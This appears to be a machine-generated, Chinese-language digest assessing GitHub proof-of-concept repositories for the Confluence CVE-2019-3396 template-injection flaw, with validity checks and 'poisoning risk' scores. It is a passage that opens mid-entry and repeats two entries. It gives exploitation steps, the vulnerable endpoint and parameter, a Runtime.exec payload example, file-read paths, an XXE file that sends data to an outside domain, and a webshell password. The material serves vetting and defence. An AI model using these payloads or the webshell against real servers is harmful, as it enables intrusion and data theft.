提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #22

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---



---

## POC #12

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #22

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
